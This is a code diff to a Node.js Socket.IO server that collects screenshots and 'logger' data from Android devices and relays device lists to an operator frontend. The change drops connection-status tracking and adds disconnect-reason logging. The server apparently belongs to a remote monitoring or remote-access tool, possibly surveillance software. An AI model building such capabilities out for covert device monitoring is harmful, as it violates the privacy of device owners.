@@ -78,6 +78,7 @@ function cleanupExpiredScreenshotRequests() {
 // Clean up expired requests every 10 seconds
 setInterval(cleanupExpiredScreenshotRequests, 10000);
 
+
 // Express
 const app = express()
 app.use(cors())
@@ -105,8 +106,7 @@ frontendIo.on("connection", async (socket) => {
         try {
             const deviceList = Array.from(devices.values()).map((d) => ({
                 ...d.info,
-                ID: d.info.device_uuid,
-                connected: d.connected
+                ID: d.info.device_uuid
             })).slice(0, 20);
             socket.emit("info", deviceList);
         } finally {
@@ -153,7 +153,7 @@ frontendIo.on("connection", async (socket) => {
             await devicesMutex.acquire();
             try {
                 const device = devices.get(deviceId);
-                if (device && device.socket && device.connected) {
+                if (device && device.socket) {
                     // Check if there's already a pending request for this device
                     const existingRequest = pendingScreenshots.get(deviceId);
 
@@ -281,8 +281,6 @@ androidIo.on("connection", async (socket) => {
                 // Update existing device - ensure clean state
                 device.info = data;
                 device.socket = socket;
-                device.connected = true;
-                device.lastSeen = Date.now();
                 // Clean up any stale screenshot requests for this device
                 if (pendingScreenshots.has(deviceUuid)) {
                     console.log(chalk.yellow(`Cleaning up stale screenshot request for reconnected device ${deviceUuid}`));
@@ -296,9 +294,7 @@ androidIo.on("connection", async (socket) => {
                 device = {
                     info: data,
                     socket: socket,
-                    connected: true,
-                    logs: [],
-                    lastSeen: Date.now()
+                    logs: []
                 };
                 devices.set(deviceUuid, device);
             }
@@ -319,8 +315,7 @@ androidIo.on("connection", async (socket) => {
         try {
             const deviceList = Array.from(devices.values()).map((d) => ({
                 ...d.info,
-                ID: d.info.device_uuid,
-                connected: d.connected
+                ID: d.info.device_uuid
             })).slice(0, 20);
 
             frontendIo.emit("info", deviceList);
@@ -329,13 +324,15 @@ androidIo.on("connection", async (socket) => {
             devicesMutex.release();
         }
 
-        socket.on("disconnect", async () => {
+        socket.on("disconnect", async (reason) => {
             // Capture deviceUuid before socket cleanup
             const deviceUuid = socket.deviceUuid;
             if (!deviceUuid) {
-                console.log(chalk.yellow(`[!] Device disconnected without UUID`));
+                console.log(chalk.yellow(`[!] Device disconnected without UUID (reason: ${reason})`));
                 return;
             }
+
+            console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid}) - Reason: ${reason}`));
 
             try {
                 // Synchronize access to devices map
@@ -344,8 +341,6 @@ androidIo.on("connection", async (socket) => {
                     const device = devices.get(deviceUuid);
                     if (device) {
                         device.socket = null;
-                        device.connected = false;
-                        device.lastSeen = Date.now();
 
                         // Clean up logs to prevent memory leaks (keep only recent 100 entries)
                         if (device.logs && device.logs.length > 100) {
@@ -377,15 +372,12 @@ androidIo.on("connection", async (socket) => {
                         console.log(chalk.yellow(`[!] No device found in DB for UUID: ${deviceUuid}`));
                     }
 
-                    console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid})`));
-
                     // Broadcast updated device list to frontends with mutex protection
                     const deviceList = Array.from(devices.values()).map((d) => ({
                         ...d.info,
-                        ID: d.info.device_uuid,
-                        connected: d.connected
+                        ID: d.info.device_uuid
                     })).slice(0, 20);
-
+        
                     frontendIo.emit("info", deviceList);
                     console.log(chalk.blue(`[i] Status broadcast sent to frontend(s) - ${deviceList.length} connected devices`));
 
@@ -401,8 +393,7 @@ androidIo.on("connection", async (socket) => {
                     try {
                         const deviceList = Array.from(devices.values()).map((d) => ({
                             ...d.info,
-                            ID: d.info.device_uuid,
-                            connected: d.connected
+                            ID: d.info.device_uuid
                         })).slice(0, 20);
                         frontendIo.emit("info", deviceList);
                         console.log(chalk.blue(`[i] Emergency broadcast sent after disconnect error`));
@@ -425,7 +416,12 @@ androidIo.on("connection", async (socket) => {
                 let device;
                 try {
                     device = devices.get(deviceUuid);
-                    if (!device) return;
+                    if (!device) {
+                        console.log(chalk.yellow(`[!] Received logger data from unknown device ${deviceUuid}, ignoring`));
+                        return;
+                    }
+
+                    // Device is sending logger data
 
                     // console.log(`Logger from device ${deviceUuid}: ${data}`);
                     device.logs.push({ timestamp: Date.now(), log: data });
@@ -476,6 +472,7 @@ androidIo.on("connection", async (socket) => {
                     const device = devices.get(deviceUuid);
                     if (device) {
                         device.lastSeen = Date.now();
+                        // Device is sending screenshot data
                     }
                 } finally {
                     devicesMutex.release();
@@ -515,6 +512,7 @@ androidIo.on("connection", async (socket) => {
                 frontendIo.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
             }
         })
+
     } catch (error) {
         console.error('Connection error:', error);
         socket.disconnect();
